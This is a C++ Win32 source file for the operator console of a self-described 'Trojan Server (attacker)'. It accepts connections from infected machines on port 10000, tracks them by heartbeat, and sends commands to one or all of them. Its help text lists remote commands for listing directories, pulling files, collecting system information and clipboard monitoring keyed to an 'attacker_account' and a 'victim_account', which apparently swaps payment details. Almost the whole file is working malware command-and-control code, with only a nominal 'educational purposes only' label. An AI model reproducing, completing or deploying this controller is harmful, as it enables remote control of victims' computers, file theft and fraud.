// server_gui.cpp - Trojan Server (attacker) with GUI
#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <commctrl.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <mutex>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "comctl32.lib")

#define DEFAULT_PORT 10000
#define BUFFER_SIZE 4096

// Window dimensions
#define WINDOW_WIDTH 800
#define WINDOW_HEIGHT 600

// Control IDs
#define IDC_LISTVIEW    1001
#define IDC_EDIT_CMD    1002
#define IDC_SEND_BTN    1003
#define IDC_SENDALL_BTN 1004
#define IDC_STATUS_BAR  1005
#define IDC_LOG_EDIT    1006

// Menu IDs
#define IDM_EXIT        2001
#define IDM_ABOUT       2002
#define IDM_HELP        2003

// Application class name
#define APP_CLASS_NAME "TrojanServerWindowClass"

// Structure to hold client information
struct ClientInfo {
    SOCKET socket;
    struct sockaddr_in addr;
    char ipAddress[16];    // To store the IP address as string
    std::string clientId;  // To store the client identifier
    bool connected;        // Flag to track connection status
    DWORD lastHeartbeat;   // Timestamp of last heartbeat
};

// Global variables
std::vector<ClientInfo> clients;
std::mutex clientsMutex;    // Mutex to protect access to the clients vector
WSADATA wsaData;
bool serverRunning = true;
HWND hwndMain = NULL;       // Main window handle
HWND hwndListView = NULL;   // ListView handle for client display
HWND hwndEditCmd = NULL;    // Edit control for command input
HWND hwndSendBtn = NULL;    // Button to send command to selected client
HWND hwndSendAllBtn = NULL; // Button to send command to all clients
HWND hwndStatusBar = NULL;  // Status bar control
HWND hwndLogEdit = NULL;    // Log display edit control
SOCKET serverSocket;        // Server socket
HANDLE hAcceptThread = NULL;  // Handle to accept connections thread
HANDLE hHeartbeatThread = NULL; // Handle to heartbeat monitor thread

// Function prototypes
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
bool InitializeWinsock();
bool CreateServerSocket(SOCKET& serverSocket, sockaddr_in& serverAddr);
DWORD WINAPI HandleClient(LPVOID lpParam);
void CleanupWinsock();
DWORD WINAPI AcceptConnectionsThread(LPVOID lpParam);
void ListClients();
void SendCommandToClient(int clientIndex, const std::string& command);
void SendCommandToAllClients(const std::string& command);
void RemoveDisconnectedClient(int clientIndex);
DWORD WINAPI HeartbeatMonitorThread(LPVOID lpParam);
void InitializeGUI(HWND hwnd);
void AddClientToListView(int index, const ClientInfo& client);
void UpdateClientInListView(int index, const ClientInfo& client);
void RemoveClientFromListView(int index);
void DisplayHelp();
void LogMessage(const char* format, ...);
void ClearClientListView();
void LoadListViewColumns();
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow);
ATOM RegisterAppClass(HINSTANCE hInstance);
void ExecuteCommand();

// Initialize Winsock
bool InitializeWinsock() {
    WORD wVersionRequested = MAKEWORD(2, 2);
    int result = WSAStartup(wVersionRequested, &wsaData);
    if (result != 0) {
        LogMessage("WSAStartup failed: %d", result);
        return false;
    }
    return true;
}

// Create server socket
bool CreateServerSocket(SOCKET& serverSocket, sockaddr_in& serverAddr) {
    // Create socket
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        LogMessage("Error creating socket: %d", WSAGetLastError());
        WSACleanup();
        return false;
    }

    // Set up server address
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DEFAULT_PORT);
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind socket
    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        LogMessage("Bind failed: %d", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
        return false;
    }

    // Listen for incoming connections
    if (listen(serverSocket, 5) == SOCKET_ERROR) {
        LogMessage("Listen failed: %d", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
        return false;
    }

    return true;
}

// Function to handle client messages
DWORD WINAPI HandleClient(LPVOID lpParam) {
    int clientIndex = *(int*)lpParam;
    delete (int*)lpParam;  // Free memory allocated for clientIndex
    
    char buffer[BUFFER_SIZE];
    int bytesReceived;
    
    // Get initial client IP for logging (accessing shared data safely)
    std::string clientIp;
    {
        std::lock_guard<std::mutex> lock(clientsMutex);
        if (clientIndex >= clients.size()) {
            LogMessage("Invalid client index");
            return 1;
        }
        clientIp = clients[clientIndex].ipAddress;
    }
    
    LogMessage("Starting handler for client %s", clientIp.c_str());
    
    while (serverRunning) {
        // Get current socket safely
        SOCKET clientSocket;
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            if (clientIndex >= clients.size()) {
                LogMessage("Client index no longer valid");
                return 1;
            }
            clientSocket = clients[clientIndex].socket;
        }
        
        // Receive data from client
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        
        if (bytesReceived <= 0) {
            // Client disconnected or error occurred
            LogMessage("Client %s disconnected", clientIp.c_str());
            RemoveDisconnectedClient(clientIndex);
            break;
        }
        
        // Null terminate the received data
        buffer[bytesReceived] = '\0';
        
        std::string message(buffer);
        
        // Process the received data
        if (message.substr(0, 14) == "CLIENT_CONNECT:") {
            // Extract client ID from connection message
            std::string clientId = message.substr(14);
            
            // Update client ID in the vector
            std::lock_guard<std::mutex> lock(clientsMutex);
            if (clientIndex < clients.size()) {
                clients[clientIndex].clientId = clientId;
                clients[clientIndex].lastHeartbeat = GetTickCount();
                LogMessage("Client %s identified as: %s", clientIp.c_str(), clientId.c_str());
                
                // Update client in ListView
                SendMessage(hwndMain, WM_APP + 1, (WPARAM)clientIndex, 0);
            }
        }
        else if (message.substr(0, 10) == "HEARTBEAT:") {
            // Update heartbeat timestamp
            std::lock_guard<std::mutex> lock(clientsMutex);
            if (clientIndex < clients.size()) {
                clients[clientIndex].lastHeartbeat = GetTickCount();
                // Update client in ListView with new heartbeat time
                SendMessage(hwndMain, WM_APP + 1, (WPARAM)clientIndex, 0);
            }
        }
        else {
            // Get current client ID for logging
            std::string currentClientId;
            {
                std::lock_guard<std::mutex> lock(clientsMutex);
                if (clientIndex < clients.size()) {
                    currentClientId = clients[clientIndex].clientId;
                }
            }
            
            // Regular message
            LogMessage("Received from %s (%s): %s", 
                clientIp.c_str(), 
                currentClientId.c_str(), 
                buffer);
        }
    }
    
    return 0;
}

// Remove disconnected client
void RemoveDisconnectedClient(int clientIndex) {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    if (clientIndex >= 0 && clientIndex < clients.size()) {
        closesocket(clients[clientIndex].socket);
        
        // Post message to main window to update the ListView
        PostMessage(hwndMain, WM_APP + 2, (WPARAM)clientIndex, 0);
        
        clients.erase(clients.begin() + clientIndex);
        LogMessage("Client at index %d removed from the list", clientIndex);
    }
}

// Function to accept clients
DWORD WINAPI AcceptConnectionsThread(LPVOID lpParam) {
    SOCKET serverSocket = *(SOCKET*)lpParam;
    sockaddr_in clientAddr;
    int clientAddrSize = sizeof(clientAddr);

    LogMessage("Starting to accept connections...");

    while (serverRunning) {
        // Accept a connection
        SOCKET clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrSize);
        
        if (clientSocket == INVALID_SOCKET) {
            LogMessage("Accept failed: %d", WSAGetLastError());
            Sleep(1000);  // Short delay to prevent CPU spike on continuous failures
            continue;
        }
        
        // Create client info
        ClientInfo newClient;
        newClient.socket = clientSocket;
        newClient.addr = clientAddr;
        newClient.connected = true;
        newClient.lastHeartbeat = GetTickCount();
        newClient.clientId = "Unknown";  // Will be updated when client sends identification
        
        // Convert IP address to string
        strcpy_s(newClient.ipAddress, inet_ntoa(clientAddr.sin_addr));
        
        // Add client to list
        int newClientIndex;
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            clients.push_back(newClient);
            newClientIndex = clients.size() - 1;
        }
        
        LogMessage("New client connected: %s (Index: %d)", newClient.ipAddress, newClientIndex);
        
        // Update GUI on main thread
        PostMessage(hwndMain, WM_APP, (WPARAM)newClientIndex, 0);
        
        // Create a thread to handle the client
        int* clientIndexPtr = new int(newClientIndex);
        HANDLE hThread = CreateThread(NULL, 0, HandleClient, (LPVOID)clientIndexPtr, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);  // We don't need to track this handle
        } else {
            delete clientIndexPtr;  // Clean up if thread creation failed
            LogMessage("Failed to create client handler thread");
        }
    }
    
    return 0;
}

// Thread to monitor client heartbeats
DWORD WINAPI HeartbeatMonitorThread(LPVOID lpParam) {
    const DWORD HEARTBEAT_TIMEOUT = 120000;  // 120 seconds (2 minutes)
    
    while (serverRunning) {
        std::vector<int> clientsToRemove;
        DWORD currentTime = GetTickCount();
        
        // Check for clients without recent heartbeats
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            
            for (int i = 0; i < clients.size(); i++) {
                DWORD timeSinceLastHeartbeat = currentTime - clients[i].lastHeartbeat;
                
                if (timeSinceLastHeartbeat > HEARTBEAT_TIMEOUT) {
                    LogMessage("Client %s (%s) timed out (no heartbeat for %d seconds)", 
                        clients[i].ipAddress, 
                        clients[i].clientId.c_str(), 
                        timeSinceLastHeartbeat / 1000);
                    
                    clientsToRemove.push_back(i);
                }
            }
        }
        
        // Remove timed out clients (in reverse order to avoid index issues)
        for (int i = clientsToRemove.size() - 1; i >= 0; i--) {
            RemoveDisconnectedClient(clientsToRemove[i]);
        }
        
        // Check every 30 seconds
        Sleep(30000);
    }
    
    return 0;
}

// List connected clients to log
void ListClients() {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    LogMessage("=== Connected Clients (%zu) ===", clients.size());
    
    if (clients.empty()) {
        LogMessage("No clients connected");
    } else {
        for (size_t i = 0; i < clients.size(); i++) {
            DWORD currentTime = GetTickCount();
            DWORD timeSinceLastHeartbeat = currentTime - clients[i].lastHeartbeat;
            
            LogMessage("%zu: IP: %s, ID: %s, Last heartbeat: %d seconds ago", 
                i, 
                clients[i].ipAddress, 
                clients[i].clientId.c_str(),
                timeSinceLastHeartbeat / 1000);
        }
    }
    
    LogMessage("===========================");
}

// Send command to a specific client
void SendCommandToClient(int clientIndex, const std::string& command) {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    if (clientIndex >= 0 && clientIndex < clients.size()) {
        if (send(clients[clientIndex].socket, command.c_str(), command.length(), 0) == SOCKET_ERROR) {
            LogMessage("Failed to send command to client %d (%s): %d", 
                clientIndex, 
                clients[clientIndex].ipAddress, 
                WSAGetLastError());
        } else {
            LogMessage("Command sent to client %d (%s): %s", 
                clientIndex, 
                clients[clientIndex].ipAddress, 
                command.c_str());
        }
    } else {
        LogMessage("Invalid client index: %d", clientIndex);
    }
}

// Send command to all connected clients
void SendCommandToAllClients(const std::string& command) {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    if (clients.empty()) {
        LogMessage("No clients connected");
        return;
    }
    
    for (size_t i = 0; i < clients.size(); i++) {
        if (send(clients[i].socket, command.c_str(), command.length(), 0) == SOCKET_ERROR) {
            LogMessage("Failed to send to client %zu (%s): %d", 
                i, 
                clients[i].ipAddress, 
                WSAGetLastError());
        } else {
            LogMessage("Command sent to client %zu (%s)", i, clients[i].ipAddress);
        }
    }
}

// Cleanup Winsock
void CleanupWinsock() {
    std::lock_guard<std::mutex> lock(clientsMutex);
    
    // Close all client sockets
    for (size_t i = 0; i < clients.size(); i++) {
        closesocket(clients[i].socket);
    }
    
    clients.clear();
    WSACleanup();
}

// Initialize the main window GUI components
void InitializeGUI(HWND hwnd) {
    // Create a ListView
    hwndListView = CreateWindowEx(
        0, WC_LISTVIEW, "",
        WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT | LVS_SINGLESEL,
        10, 10, WINDOW_WIDTH - 20, 200,
        hwnd, (HMENU)IDC_LISTVIEW, GetModuleHandle(NULL), NULL);
    
    // Set extended ListView styles
    ListView_SetExtendedListViewStyle(hwndListView, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
    
    // Load ListView columns
    LoadListViewColumns();
    
    // Create log display (rich edit control)
    hwndLogEdit = CreateWindowEx(
        0, "EDIT", "",
        WS_CHILD | WS_VISIBLE | WS_BORDER | ES_MULTILINE | ES_AUTOVSCROLL | 
        ES_READONLY | WS_VSCROLL,
        10, 220, WINDOW_WIDTH - 20, 250,
        hwnd, (HMENU)IDC_LOG_EDIT, GetModuleHandle(NULL), NULL);
    
    // Set font for log edit
    HFONT hFont = CreateFont(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, 
                            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, 
                            DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Consolas");
    SendMessage(hwndLogEdit, WM_SETFONT, (WPARAM)hFont, MAKELPARAM(TRUE, 0));
    
    // Create command input box
    hwndEditCmd = CreateWindowEx(
        0, "EDIT", "",
        WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
        10, 480, WINDOW_WIDTH - 220, 30,
        hwnd, (HMENU)IDC_EDIT_CMD, GetModuleHandle(NULL), NULL);
    
    // Create Send button
    hwndSendBtn = CreateWindowEx(
        0, "BUTTON", "Send to Selected",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        WINDOW_WIDTH - 200, 480, 100, 30,
        hwnd, (HMENU)IDC_SEND_BTN, GetModuleHandle(NULL), NULL);
    
    // Create SendAll button
    hwndSendAllBtn = CreateWindowEx(
        0, "BUTTON", "Send to All",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        WINDOW_WIDTH - 90, 480, 80, 30,
        hwnd, (HMENU)IDC_SENDALL_BTN, GetModuleHandle(NULL), NULL);
    
    // Create status bar
    hwndStatusBar = CreateWindowEx(
        0, STATUSCLASSNAME, NULL,
        WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP,
        0, 0, 0, 0,
        hwnd, (HMENU)IDC_STATUS_BAR, GetModuleHandle(NULL), NULL);
    
    // Initialize status bar
    SendMessage(hwndStatusBar, SB_SETTEXT, 0, (LPARAM)"Server started on port 10000");
}

// Configure ListView columns
void LoadListViewColumns() {
    LVCOLUMN lvc;
    
    // Initialize the LVCOLUMN structure
    lvc.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT | LVCF_SUBITEM;
    lvc.fmt = LVCFMT_LEFT;
    
    // Add columns
    lvc.iSubItem = 0;
    lvc.cx = 40;
    lvc.pszText = (LPSTR)"ID";
    ListView_InsertColumn(hwndListView, 0, &lvc);
    
    lvc.iSubItem = 1;
    lvc.cx = 120;
    lvc.pszText = (LPSTR)"IP Address";
    ListView_InsertColumn(hwndListView, 1, &lvc);
    
    lvc.iSubItem = 2;
    lvc.cx = 200;
    lvc.pszText = (LPSTR)"Client ID";
    ListView_InsertColumn(hwndListView, 2, &lvc);
    
    lvc.iSubItem = 3;
    lvc.cx = 150;
    lvc.pszText = (LPSTR)"Last Heartbeat";
    ListView_InsertColumn(hwndListView, 3, &lvc);
    
    lvc.iSubItem = 4;
    lvc.cx = 80;
    lvc.pszText = (LPSTR)"Status";
    ListView_InsertColumn(hwndListView, 4, &lvc);
}

// Add a client to the ListView
void AddClientToListView(int index, const ClientInfo& client) {
    LVITEM lvi;
    char szTemp[32];
    
    lvi.mask = LVIF_TEXT;
    lvi.iItem = index;
    
    // ID column
    sprintf_s(szTemp, "%d", index);
    lvi.iSubItem = 0;
    lvi.pszText = szTemp;
    ListView_InsertItem(hwndListView, &lvi);
    
    // IP Address column
    lvi.iSubItem = 1;
    lvi.pszText = (LPSTR)client.ipAddress;
    ListView_SetItem(hwndListView, &lvi);
    
    // Client ID column
    lvi.iSubItem = 2;
    lvi.pszText = (LPSTR)client.clientId.c_str();
    ListView_SetItem(hwndListView, &lvi);
    
    // Last Heartbeat column
    DWORD currentTime = GetTickCount();
    DWORD timeSinceLastHb = currentTime - client.lastHeartbeat;
    sprintf_s(szTemp, "%d seconds ago", timeSinceLastHb / 1000);
    lvi.iSubItem = 3;
    lvi.pszText = szTemp;
    ListView_SetItem(hwndListView, &lvi);
    
    // Status column
    lvi.iSubItem = 4;
    lvi.pszText = client.connected ? (LPSTR)"Connected" : (LPSTR)"Disconnected";
    ListView_SetItem(hwndListView, &lvi);
}

// Update a client in the ListView
void UpdateClientInListView(int index, const ClientInfo& client) {
    LVITEM lvi;
    char szTemp[32];
    
    lvi.mask = LVIF_TEXT;
    lvi.iItem = index;
    
    // IP Address column
    lvi.iSubItem = 1;
    lvi.pszText = (LPSTR)client.ipAddress;
    ListView_SetItem(hwndListView, &lvi);
    
    // Client ID column
    lvi.iSubItem = 2;
    lvi.pszText = (LPSTR)client.clientId.c_str();
    ListView_SetItem(hwndListView, &lvi);
    
    // Last Heartbeat column
    DWORD currentTime = GetTickCount();
    DWORD timeSinceLastHb = currentTime - client.lastHeartbeat;
    sprintf_s(szTemp, "%d seconds ago", timeSinceLastHb / 1000);
    lvi.iSubItem = 3;
    lvi.pszText = szTemp;
    ListView_SetItem(hwndListView, &lvi);
    
    // Status column
    lvi.iSubItem = 4;
    lvi.pszText = client.connected ? (LPSTR)"Connected" : (LPSTR)"Disconnected";
    ListView_SetItem(hwndListView, &lvi);
}

// Remove a client from the ListView
void RemoveClientFromListView(int index) {
    ListView_DeleteItem(hwndListView, index);
    
    // Update remaining indices
    for (int i = index; i < ListView_GetItemCount(hwndListView); i++) {
        LVITEM lvi;
        char szTemp[32];
        
        sprintf_s(szTemp, "%d", i);
        
        lvi.mask = LVIF_TEXT;
        lvi.iItem = i;
        lvi.iSubItem = 0;
        lvi.pszText = szTemp;
        ListView_SetItem(hwndListView, &lvi);
    }
}

// Clear all items from the ListView
void ClearClientListView() {
    ListView_DeleteAllItems(hwndListView);
}

// Display Help information in the log
void DisplayHelp() {
    LogMessage("\nAvailable commands:");
    LogMessage("  LIST <dir>       - List files in directory");
    LogMessage("  GETFILE <file>   - Get file content");
    LogMessage("  SYSINFO          - Get system information");
    LogMessage("  PING             - Simple ping test");
    LogMessage("  CLIPBOARD_START <attacker_account> [victim_account] - Start clipboard monitoring");
    LogMessage("  CLIPBOARD_STOP   - Stop clipboard monitoring");
    LogMessage("  CLIPBOARD_STATUS - Get clipboard monitoring status");
}

// Log a message to the log control
void LogMessage(const char* format, ...) {
    static char szBuffer[4096];
    static char szTimestamp[64];
    static SYSTEMTIME st;
    
    // Get the current time
    GetLocalTime(&st);
    sprintf_s(szTimestamp, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
    
    // Format the message
    va_list args;
    va_start(args, format);
    vsprintf_s(szBuffer, format, args);
    va_end(args);
    
    // Combine timestamp and message
    std::string fullMessage = std::string(szTimestamp) + std::string(szBuffer) + "\r\n";
    
    // Append text to the edit control
    int textLength = GetWindowTextLength(hwndLogEdit);
    SendMessage(hwndLogEdit, EM_SETSEL, (WPARAM)textLength, (LPARAM)textLength);
    SendMessage(hwndLogEdit, EM_REPLACESEL, FALSE, (LPARAM)fullMessage.c_str());
    
    // Scroll to bottom
    SendMessage(hwndLogEdit, EM_SCROLLCARET, 0, 0);
}

// Register the window class
ATOM RegisterAppClass(HINSTANCE hInstance) {
    WNDCLASSEX wcex;
    
    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = NULL;
    wcex.lpszClassName = APP_CLASS_NAME;
    wcex.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
    
    return RegisterClassEx(&wcex);
}

// Initialize the application instance
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow) {
    // Create the window
    hwndMain = CreateWindow(
        APP_CLASS_NAME,
        "Trojan Server (GUI)",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        WINDOW_WIDTH, WINDOW_HEIGHT,
        NULL,
        NULL,
        hInstance,
        NULL);
    
    if (!hwndMain) {
        return FALSE;
    }
    
    // Create menu
    HMENU hMenu = CreateMenu();
    HMENU hFileMenu = CreatePopupMenu();
    
    AppendMenu(hFileMenu, MF_STRING, IDM_HELP, "&Help");
    AppendMenu(hFileMenu, MF_STRING, IDM_ABOUT, "&About");
    AppendMenu(hFileMenu, MF_SEPARATOR, 0, NULL);
    AppendMenu(hFileMenu, MF_STRING, IDM_EXIT, "E&xit");
    
    AppendMenu(hMenu, MF_POPUP, (UINT_PTR)hFileMenu, "&File");
    
    SetMenu(hwndMain, hMenu);
    
    // Create GUI controls
    InitializeGUI(hwndMain);
    
    // Show and update the window
    ShowWindow(hwndMain, nCmdShow);
    UpdateWindow(hwndMain);
    
    return TRUE;
}

// Execute the command from the input box
void ExecuteCommand() {
    char szCommand[1024];
    GetWindowText(hwndEditCmd, szCommand, sizeof(szCommand));
    
    if (strlen(szCommand) > 0) {
        // Get selected client index
        int selectedIndex = ListView_GetNextItem(hwndListView, -1, LVNI_SELECTED);
        
        if (selectedIndex >= 0) {
            // Send command to selected client
            SendCommandToClient(selectedIndex, szCommand);
        } else {
            LogMessage("No client selected. Select a client or use 'Send to All'");
        }
        
        // Clear the command edit box
        SetWindowText(hwndEditCmd, "");
    }
}

// WndProc - Window Procedure
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
        case WM_CREATE:
            // Start server socket
            sockaddr_in serverAddr;
            if (!InitializeWinsock() || !CreateServerSocket(serverSocket, serverAddr)) {
                MessageBox(hwnd, "Failed to initialize server", "Error", MB_OK | MB_ICONERROR);
                return -1;
            }
            
            // Create threads for accepting connections and monitoring heartbeats
            hAcceptThread = CreateThread(NULL, 0, AcceptConnectionsThread, &serverSocket, 0, NULL);
            if (!hAcceptThread) {
                LogMessage("Failed to create accept thread");
                CleanupWinsock();
                return -1;
            }
            
            hHeartbeatThread = CreateThread(NULL, 0, HeartbeatMonitorThread, NULL, 0, NULL);
            if (!hHeartbeatThread) {
                LogMessage("Failed to create heartbeat monitor thread");
                // Continue anyway
            }
            
            DisplayHelp();
            return 0;
            
        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case IDM_EXIT:
                    DestroyWindow(hwnd);
                    break;
                    
                case IDM_ABOUT:
                    MessageBox(hwnd, "Trojan Server (GUI)\nFor educational purposes only.", 
                              "About", MB_OK | MB_ICONINFORMATION);
                    break;
                    
                case IDM_HELP:
                    DisplayHelp();
                    break;
                    
                case IDC_SEND_BTN:
                    ExecuteCommand();
                    break;
                    
                    case IDC_SENDALL_BTN:
                    {
                        char szCommand[1024];
                        GetWindowText(hwndEditCmd, szCommand, sizeof(szCommand));
                        
                        if (strlen(szCommand) > 0) {
                            SendCommandToAllClients(szCommand);
                            SetWindowText(hwndEditCmd, "");
                        } else {
                            LogMessage("Command is empty");
                        }
                    }
                    break;
            }
            break;
            
        case WM_APP: // Add client to ListView
            {
                int clientIndex = (int)wParam;
                std::lock_guard<std::mutex> lock(clientsMutex);
                if (clientIndex >= 0 && clientIndex < clients.size()) {
                    AddClientToListView(clientIndex, clients[clientIndex]);
                    char szStatus[100];
                    sprintf_s(szStatus, "New client connected: %s", clients[clientIndex].ipAddress);
                    SendMessage(hwndStatusBar, SB_SETTEXT, 0, (LPARAM)szStatus);
                }
            }
            break;
            
        case WM_APP + 1: // Update client in ListView
            {
                int clientIndex = (int)wParam;
                std::lock_guard<std::mutex> lock(clientsMutex);
                if (clientIndex >= 0 && clientIndex < clients.size()) {
                    UpdateClientInListView(clientIndex, clients[clientIndex]);
                }
            }
            break;
            
        case WM_APP + 2: // Remove client from ListView
            {
                int clientIndex = (int)wParam;
                RemoveClientFromListView(clientIndex);
                
                char szStatus[100];
                sprintf_s(szStatus, "Client disconnected (index: %d)", clientIndex);
                SendMessage(hwndStatusBar, SB_SETTEXT, 0, (LPARAM)szStatus);
            }
            break;
            
        case WM_NOTIFY:
            // Handle notifications from controls
            if (((LPNMHDR)lParam)->idFrom == IDC_LISTVIEW) {
                switch (((LPNMHDR)lParam)->code) {
                    case NM_DBLCLK:
                        // Double click on a client - could implement feature here
                        {
                            int selectedIndex = ListView_GetNextItem(hwndListView, -1, LVNI_SELECTED);
                            if (selectedIndex >= 0) {
                                std::lock_guard<std::mutex> lock(clientsMutex);
                                if (selectedIndex < clients.size()) {
                                    LogMessage("Selected client: %s (%s)", 
                                        clients[selectedIndex].ipAddress,
                                        clients[selectedIndex].clientId.c_str());
                                }
                            }
                        }
                        break;
                }
            }
            break;
            
        case WM_SIZE:
            {
                RECT rcClient;
                GetClientRect(hwnd, &rcClient);
                int width = rcClient.right - rcClient.left;
                int height = rcClient.bottom - rcClient.top;
                
                // Resize controls based on new window size
                // Leave 20px margins on sides
                MoveWindow(hwndListView, 10, 10, width - 20, 200, TRUE);
                MoveWindow(hwndLogEdit, 10, 220, width - 20, height - 310, TRUE);
                MoveWindow(hwndEditCmd, 10, height - 80, width - 240, 30, TRUE);
                MoveWindow(hwndSendBtn, width - 220, height - 80, 120, 30, TRUE);
                MoveWindow(hwndSendAllBtn, width - 90, height - 80, 80, 30, TRUE);
                
                // Resize status bar (automatically handled by status bar)
                SendMessage(hwndStatusBar, WM_SIZE, 0, 0);
            }
            break;
            
        case WM_CLOSE:
            DestroyWindow(hwnd);
            break;
            
        case WM_DESTROY:
            // Stop server and clean up
            serverRunning = false;
            
            // Close server socket
            closesocket(serverSocket);
            
            // Wait for threads to terminate
            if (hAcceptThread) {
                WaitForSingleObject(hAcceptThread, 3000); // Wait up to 3 seconds
                CloseHandle(hAcceptThread);
            }
            
            if (hHeartbeatThread) {
                WaitForSingleObject(hHeartbeatThread, 3000);
                CloseHandle(hHeartbeatThread);
            }
            
            // Final cleanup
            CleanupWinsock();
            
            // Quit the application
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, message, wParam, lParam);
    }
    
    return 0;
}

// WinMain function - Entry point for Windows applications
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Initialize common controls
    INITCOMMONCONTROLSEX icc;
    icc.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icc.dwICC = ICC_LISTVIEW_CLASSES | ICC_BAR_CLASSES;
    InitCommonControlsEx(&icc);
    
    // Register window class
    RegisterAppClass(hInstance);
    
    // Initialize application instance
    if (!InitInstance(hInstance, nCmdShow)) {
        return FALSE;
    }
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        // Handle enter key in command edit box
        if (msg.message == WM_KEYDOWN && msg.wParam == VK_RETURN && 
            GetFocus() == hwndEditCmd) {
            ExecuteCommand();
            continue;
        }
        
        // Normal message processing
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return (int)msg.wParam;
}